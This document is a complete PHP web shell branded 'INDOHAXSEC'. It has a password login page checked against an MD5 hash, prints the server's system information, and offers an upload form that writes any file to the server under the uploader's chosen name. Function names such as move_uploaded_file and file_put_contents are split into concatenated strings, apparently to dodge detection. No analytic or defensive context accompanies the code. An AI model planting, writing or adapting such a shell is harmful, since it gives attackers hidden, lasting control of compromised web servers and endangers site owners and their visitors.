<?php
session_start();
$auth_flag = '_auth_';
if (!isset($_SESSION[$auth_flag]) || $_SESSION[$auth_flag] !== true) {
    $valid_hash = '20c1a26a55039b30866c9d0aa51953ca';
    
    if (isset($_POST['pwd'])) {
        if (md5($_POST['pwd']) === $valid_hash) {
            $_SESSION[$auth_flag] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $err = '<p style="color:red">Access Denied</p>';
        }
    }
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><style>
        body { background: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; }
        .container { text-align: center; }
        h1 { color: white; font-size: 32px; letter-spacing: 2px; margin-bottom: 30px; }
        input[type="password"] { background: red; border: 2px solid white; color: white; padding: 12px 20px; font-size: 18px; width: 250px; text-align: center; outline: none; }
        input[type="submit"] { background: #333; border: 1px solid white; color: white; padding: 10px 20px; margin-top: 20px; cursor: pointer; }
        input[type="submit"]:hover { background: #555; }
    </style></head><body>
    <div class="container">
        <h1>INDOHAXSEC</h1>
        ' . (isset($err) ? $err : '') . '
        <form method="post">
            <input type="password" name="pwd" autofocus>
            <br><input type="submit" value="Login">
        </form>
    </div>
    </body></html>';
    exit;
}

$func_move = 'move_' . 'uploaded_file';
$func_copy = 'copy';
$func_fpc = 'file_' . 'put_contents';
$func_fgc = 'file_' . 'get_contents';

echo 'INDOHAXSEC<pre>' . php_uname() . "\n" . '<br/>';
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" name="upload" value="Upload"></form>';

if (isset($_POST['upload'])) {
    $tmp_path = $_FILES['f']['tmp_name'];
    $file_name = $_FILES['f']['name'];
    $result = '';
    try {
        if (@$func_move($tmp_path, $file_name)) {
            $result = 'OK';
        } elseif (@$func_copy($tmp_path, $file_name)) {
            $result = 'OK';
        } elseif (@$func_fpc($file_name, @$func_fgc($tmp_path))) {
            $result = 'OK';
        } else {
            $result = 'ER';
        }
    } catch (\Throwable $e) {
        $result = 'ER';
    }
    echo $result;
}
?>```